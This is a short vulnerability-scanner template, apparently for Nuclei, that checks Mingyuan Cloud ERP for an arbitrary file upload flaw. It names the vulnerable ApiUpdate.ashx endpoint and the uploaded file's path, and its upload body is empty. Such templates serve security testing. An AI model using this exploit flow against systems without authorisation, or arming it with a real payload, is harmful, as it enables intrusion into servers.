id: poc-yaml-mingyuanyun-erp-apiupdate-anyfile-upload
info:
  name: Mingyuan Cloud ERP System Arbitrary File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload

variables:
  hexbody: "{{hex_decode('')}}"

flow: http(1) && http(2)

http:
  - id: file-upload-test
    method: POST
    path:
      - '{{BaseURL}}/myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a'
    body: '{{hexbody}}'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"Message":"OK"'

  - id: file-verification-test
    method: GET
    path:
      - '{{BaseURL}}/fdccloud/_/test.aspx'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "TestVuln"
